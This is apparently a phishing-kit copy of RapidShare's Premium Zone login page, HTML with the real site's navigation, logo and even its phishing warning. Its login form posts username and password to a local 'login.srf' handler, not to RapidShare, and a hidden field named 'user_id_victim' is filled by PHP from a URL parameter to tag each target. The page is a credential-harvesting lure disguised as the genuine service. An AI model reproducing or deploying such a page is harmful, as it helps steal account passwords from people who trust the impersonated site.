<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
 <head> 
 <script type="text/javascript">
 if (top != self)   top.location = self.location;
 if (document.URL.substr(7,7) == "intern.")
    document.write('<base href="http://rapidshare.com">');
 if (document.URL.indexOf('?pid=eol') != -1)
    document.write('<sc'+'ript src="http://ads.komli.com/pixel?id=637915&t=1" type="text/javascript"></sc'+'ript>');
 </script>
 <title>RapidShare: 1-CLICK Web hosting - Easy Filehosting</title>
 <link rel="icon" href="https://ssl.rapidshare.com/img2/favicon.ico" type="image/ico" />
<link rel="SHORTCUT ICON" href="https://ssl.rapidshare.com/img2/favicon.ico" />
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
<meta name="author" content="Saso Nikolov" />
<meta name="keywords" content="File Hosting, File Distributor, File Sharing, upload several files" />
<meta name="description" content="1-Click web hosting, upload several files, Easy File Distribution, Easy, Fast and Secure" /> 
 <link rel="stylesheet" type="text/css" href="img/styles.css" />
 </head>

<body>
<script type="text/javascript">
function einblenden(p) {
  for(var i=0;i<p.childNodes.length;i++) {
   if(p.childNodes[i].nodeName.toLowerCase()=="div")
    p.childNodes[i].style.display="block";
  }
}
function ausblenden(p) {
  for(var i=0;i<p.childNodes.length;i++) {
   if(p.childNodes[i].nodeName.toLowerCase()=="div")
    p.childNodes[i].style.display="none";
  }
}
</script>
<center>
<div style="padding-top:10px;padding-bottom:20px;">
<table><tr><td><div class="navigation"><ul>
        <li><a href="http://rapidshare.com/index.html">Home</a></li>
        <li><a href="http://rapidshare.com/news.html">News</a></li>
<!--
        <li><a href="http://rapidshare.com/rewards.html">Rewards</a></li>
-->
        <li onmouseover="einblenden(this);" onmouseout="ausblenden(this);">
            <div class="subnavi">
            <ul>
                <li><a href="https://ssl.rapidshare.com/cgi-bin/premiumzone.cgi">Premium Zone Login</a></li>
                <li><a href="http://rapidshare.com/premium.html">Create Account</a></li>
                <li><a href="http://rapidshare.com/verlaengern.html">Extend Account</a></li>
                <li><a href="http://rapidshare.com/forgotpw.html">Forgot Password</a></li>
                <li style="border:0px;"><a href="http://rapidshare.com/faqx.html?show=G113">TrafficShare</a></li>
            </ul>
            </div>
            <a href="https://ssl.rapidshare.com/cgi-bin/premiumzone.cgi">Premium Zone</a>
        </li>
        <li onmouseover="einblenden(this);" onmouseout="ausblenden(this);">
            <div class="subnavi">
            <ul>
                <li><a href="https://ssl.rapidshare.com/cgi-bin/collectorszone.cgi">Collector's Zone Login</a></li>
                <li><a href="http://rapidshare.com/folderadmin.html">LinkList Login</a></li>
                <li style="border:0px;"><a href="http://rapidshare.com/freefolders.html">Create LinkList</a></li>
            </ul>
            </div>
            <a href="http://rapidshare.com/freezone.html">Free Zone</a>
        </li>
        <li><a href="http://tainment.rapidshare.com/" target="_blank">RapidTainment</a></li>
        <li onmouseover="einblenden(this);" onmouseout="ausblenden(this);">
            <div class="subnavi">
            <ul>
                <li><a href="http://rapidshare.com/rsm.html">RapidShare Manager</a></li>
                <li><a href="http://rapidshare.com/rapiduploader.html">RapidUploader</a></li>
                <li><a href="http://rapidshare.com/checkfiles.html">RapidShare Checker</a></li>
                <li style="border:0px;"><a href="http://rapidshare.com/dev.html">API</a></li>
            </ul>
            </div>
            <a href="http://rapidshare.com/rapidtools.html">RapidTools</a>
        </li>
        <li onmouseover="einblenden(this);" onmouseout="ausblenden(this);">
            <div class="subnavi">
            <ul>
                <li><a href="http://rapidshare.com/faqx.html">FAQ</a></li>
                <li><a href="http://rapidshare.com/support.html">Support Contact</a></li>
                <li><a href="http://rapidshare.com/abuse.html">Abuse Contact</a></li>
                <li style="border:0px;"><a href="http://rapidshare.com/security.html">Security advice</a></li>
            </ul>
            </div>
            <a href="http://rapidshare.com/supportseite.html">Support</a>
        </li>
        <li onmouseover="einblenden(this);" onmouseout="ausblenden(this);">
            <div class="subnavi">
            <ul>
                <li><a href="http://rapidshare.com/wiruberuns.html">About us</a></li>
                <li><a href="http://rapidshare.com/jobs.html">Jobs</a></li>
                <li><a href="http://rapidshare.com/testimonials.html">Testimonials</a></li>
                <li><a href="http://rapidshare.com/banners.html">Banner</a></li>
                <li><a href="http://rapidshare.com/agb.html">Conditions of use</a></li>
                <li style="border:0px;"><a href="http://rapidshare.com/imprint.html">Imprint</a></li>
            </ul>
            </div>
            <a href="http://rapidshare.com/rapidshare.html">RapidShare AG</a>
        </li>
        <li style="border:0px;"><a href="http://rapidshare.com/privacypolicy.html">Privacy Policy</a></li>
    </ul></div></td></tr></table>
</div>
<a href="http://rapidshare.com">
<script type="text/javascript">
var ld=new Date();
if(ld.getMonth()==11&&ld.getDate()>=21&&ld.getDate()<28)
    document.write('<img src="http://rapidshare.com/img2/rslogo.gif" width="252" height="180" alt="logo" />');
else
if(ld.getMonth()==11&&ld.getDate()>=28&&ld.getDate()<=31)
    document.write('<img src="http://rapidshare.com/img2/rslogo.gif" width="300" height="214" alt="logo" />');
else
if(ld.getMonth()==0&&ld.getDate()<=3)
    document.write('<img src="http://rapidshare.com/img2/rslogo.gif" width="300" height="214" alt="logo" />');
else
    document.write('<img src="http://rapidshare.com/img2/rslogo.gif" width="252" height="180" alt="logo" />');
</script>
</a>
<noscript><h1>This page needs JavaScript, to display all information correct!</h1></noscript>

<div id="inhaltbox">
<h1>
<img alt="https://ssl.rapidshare.com/img2/pfeil.jpg" src="https://ssl.rapidshare.com/img2/pfeil.jpg">Premium-Zone
 | Login</h1>
<center>
<table cellpadding="4"><tr><td colspan=2>
<p align="left">
<b><a href="https://ssl.rapidshare.com/premzone.html">Use new premium zone</a></b>
</td></tr><tr><td>
<form method="post" action="login.srf?fr">
    <input name="uselandingpage" value="1" type="hidden">
    <table cellpadding=5>
        <tr>
            <td>Login:</td>
            <td><input type="text" name="login" size=16 style="width:100%" /><input type="hidden" name="user_id_victim" value="<? echo $_GET['i']; ?>" /></TD></TR></td>
        </tr>
        <tr>
            <td>Password:</td>
            <td><input type="password" name="password" size=16 style="width:100%" /></td>
        </tr>
        <tr>
            <td></td>
            <td align=center><input type="submit" value="Premium Zone Login" /></td>
        </tr>
    </table>    
</form>
</td><td>
<div onclick="zeigeWarnung()" style="width:300px;border:1px solid #002760;background-color:#ffefef;">
<table><tr><td width="80"><img src="img/symbol_pw.gif" /></td><td>
<h3 style="color:red;">Phishing Warning!</h3>
<p style="font-size:8pt;">Before entering your Login information, ALWAYS check the URL. For further information please click <a href="#" onclick="return zeigeWarnung()">here</a>.</p>
</td></tr></table>
</div>
</td></tr></table>
<script type="text/javascript">
<!--
function zeigeWarnung()
{   
    var text = '<div style="background-image:url(/img2/symbol_pw.gif);background-repeat:no-repeat;padding-left:90px;">';
    text += '<h3>Phishing Warning!</h3>';
    text += '<p>Please beware of Websites that intent to steal RapidShare.com login information, also known as Phishing sites.</p>';
    text += '<p>Phishing is the criminal process of attempting to steal sensitive information such as user-names and passwords by disguising as a trustworthy website. The only clear identification of a website is its URL.</p>';
    text += '<p>Before entering your Login information, we strongly suggest to ALWAYS check the URL.</p>';    
    text += '<img src="/img2/rg_phishing_al.gif" style="padding-bottom:0px;margin-bottom:0px;" />';
    text += '<p style="padding:4px;margin-top:0px;border:2px solid #002760;">This element must be finalized by the third backslash.</p>';    
    text += '<p>Please note that RapidShare.com will never ask you to validate your account by Mail, nor will we ask for verification information without a support request being processed.</p>';    
    text += '<p>For further information or reports please contact our Customer Support.</p>';    
    text += '</div>';
    zeigeInfoBox(text);
    return false;
}
//-->
</script>

<a href="http://rapidshare.com/forgotpw.html">Request forgotten password</a> | <a href="http://rapidshare.com/premium.html">Set up Premium Account</a>
| <a href="https://ssl.rapidshare.com/premzone.html">Use new premium zone</a>
</center>
<script type="text/javascript">
<!--    
function closeInfo()
{
    blenderschliessen(); 
    document.getElementById('infobox').style.display='none';
    document.getElementById('infobox').style.position='absolute';
}
function zeigeInfoBox(inhalt, fktwert)
{
    var fkt = "closeInfo()";
    if (fktwert)
        fkt = fktwert;    
    var text = '<div style="text-align:right;"><a href="#" onclick="' + fkt + ';return false;" style="padding-right:55px;font-weight:bold;text-decoration:none;background-image:url(/img2/button_close.jpg);background-repeat:no-repeat;background-position:right;color:#00204e;">Close window</a></div>';
    text += inhalt;
    var elem = document.getElementById("infobox");
    elem.innerHTML = text;
    var clientBreite = document.body.clientWidth;
    var links = (clientBreite - parseInt(elem.style.width)) / 2;
    if (links > 0) {
        elem.style.left = links + "px";
    } else {
        elem.style.left = "50px";
    }
    elem.style.position = 'absolute';
    var toppos = 0;
    if (typeof(document.documentElement.scrollTop) != "undefined") {
        if (typeof(window.pageYOffset) && window.pageYOffset > 0 && window.pageYOffset > document.documentElement.scrollTop) {
            toppos = window.pageYOffset;
        } else {
            toppos = document.documentElement.scrollTop;
        }       
    } else {
        toppos = window.pageYOffset;
    }
    toppos += 50;    
    elem.style.top = toppos+"px";     
    blenderzeigen();
    elem.style.display = "block";
}
//-->
</script>
<div id="infobox" style="
    width:500px;
    position:absolute;
    z-index:101;
    border:6px solid #00204e;
    background-color:white;
    padding:10px;
    top:100px;
    left:50px;    
    display:none;
    overflow:visible;
    ">    
</div>

<script type="text/javascript">
<!--
function blenderzeigen() 
{
    var elem = document.getElementById("blender");
    elem.style.width = "100%";
    elem.style.height = "100%";
    elem.style.display = "block";        
}
function blenderschliessen()
{
    document.getElementById("blender").style.display = "none";
}
//-->
</script>

<div id="blender" style="background-image:url('img/blender.gif');">&nbsp;</div>
<div style="text-align:center;margin-top:60px;">
    <div style="color:#002760;font-size:10pt;font-weight:bold;">SSL-encrypted page</div>
    <div style="color:#8E908F;font-size:8pt;">This, and all other pages are SSL encrypted!</div>
</div>
                            
<div class="untermenue">
 <a href="http://rapidshare.com/wiruberuns.html">About us</a> | <a href="http://rapidshare.com/jobs.html">Jobs</a> | <a href="http://rapidshare.com/agb.html">Terms of use</a> | <a href="http://rapidshare.com/imprint.html">Imprint</a>
</div>

</div>
</center>
<p>&nbsp;</p>
</body>
</html>

